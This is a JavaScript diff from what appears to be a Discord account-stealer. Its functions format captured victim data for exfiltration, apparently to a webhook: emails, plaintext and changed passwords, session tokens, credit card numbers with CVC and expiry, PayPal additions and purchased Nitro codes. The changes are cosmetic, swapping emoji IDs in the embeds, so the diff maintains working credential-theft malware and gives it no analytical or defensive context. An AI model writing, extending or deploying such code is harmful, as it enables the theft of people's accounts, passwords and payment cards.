@@ -568,9 +568,9 @@ const getNitro = (flags) => {
     case 0:
       return '❌ No Nitro';
     case 1:
-      return '<:_:1113203204189061131> Nitro Classic';
+      return '<:_:1257039429806325780> Nitro Classic';
     case 2:
-      return '<a:_:1018193217860157530> Nitro Boost';
+      return '<:_:1257039216647340226> Nitro Boost';
     default:
       return '❌ No Nitro';
   }
@@ -580,43 +580,43 @@ const getBadges = (flags) => {
   let badges = '';
   switch (flags) {
     case 1:
-      badges += '<:_:970290544880283688> Discord Staff, ';
+      badges += '<:_:1257040093135372480> Discord Staff, ';
       break;
     case 2:
-      badges += '<:_:990990046746263625> Partnered Server Owner, ';
+      badges += '<:_:1257040210739462167> Partnered Server Owner, ';
       break;
     case 131072:
-      badges += '<a:_:1256999868333949020> Verified Bot Developer, ';
+      badges += '<:_:1257040345380687952> Verified Bot Developer, ';
       break;
     case 4194304:
       badges += '<:_:1257000596096155714> Active Developer, ';
       break;
     case 4:
-      badges += 'Hypesquad Event, ';
+      badges += '<:_:1257040480013914192> Hypesquad Event, ';
       break;
     case 16384:
-      badges += 'Gold BugHunter, ';
+      badges += '<:_:1257040593947856927> Gold BugHunter, ';
       break;
     case 8:
-      badges += 'Green BugHunter, ';
+      badges += '<:_:1257040698864304279> Green BugHunter, ';
       break;
     case 512:
-      badges += 'Early Supporter, ';
+      badges += '<:_:1257040803960983622> Early Supporter, ';
       break;
     case 128:
       badges += 'HypeSquad Brillance, ';
       break;
     case 64:
-      badges += 'HypeSquad Bravery, ';
+      badges += '<:_:1257040967454687292> HypeSquad Bravery, ';
       break;
     case 256:
-      badges += 'HypeSquad Balance, ';
+      badges += '<:_:1257041091748696166> HypeSquad Balance, ';
       break;
     case 0:
-      badges = 'None';
+      badges = '❌ None';
       break;
     default:
-      badges = 'None';
+      badges = '❌ None';
       break;
   }
   return badges;
@@ -663,16 +663,16 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            value: `<:mail:1095741024678191114> Email: **${email}** - <:_:1256993776564568237> Password: **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<:_:1257039216647340226> Nitro Type: **${nitro}**\n<:black_crown:1184938153291829288> Badges: **${badges}**\n<:_:1256629996169072670> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '**Token**',
+            name: '<:_:1256993776564568237> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -702,16 +702,16 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:_:1256993776564568237> Old Password: **${oldpassword}**\n<:_:1256993776564568237> New Password: **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<:_:1257039216647340226> Nitro Type: **${nitro}**\n<:black_crown:1184938153291829288> Badges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:_:1256993776564568237> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -741,16 +741,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:_:1256993776564568237> Password: **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<:_:1257039216647340226> Nitro Type: **${nitro}**\n<:black_crown:1184938153291829288> Badges: **${badges}**\n<:_:1256629996169072670> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:_:1256993776564568237> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -780,16 +780,16 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            value: `Time to buy some nitro`,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<:_:1257039216647340226> Nitro Type: **${nitro}*\n<:black_crown:1184938153291829288> Badges: **${badges}**\n<:_:1256629996169072670> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '**Token**',
+            name: '<:_:1256993776564568237> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -819,16 +819,16 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         fields: [
           {
             name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            value: `<:_:1256629996169072670> Credit Card Number: **${number}**\n<:_:1256993776564568237> CVC: **${cvc}**\n<a:_:1256996292358439004> Credit Card Expiration: **${expir_month}/${expir_year}**`,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<:_:1257039216647340226> Nitro Type: **${nitro}**\n<:black_crown:1184938153291829288> Badges: **${badges}**\n<:_:1256629996169072670> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:_:1256993776564568237> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -860,16 +860,16 @@ const nitroBought = async (token) => {
         fields: [
           {
             name: '**Nitro bought!**',
-            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            value: `<:_:1257039216647340226> **Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `<:_:1257039216647340226> Nitro Type: **${nitro}**\n<:black_crown:1184938153291829288> Badges: **${badges}**\n<:_:1256629996169072670> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:_:1256993776564568237> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
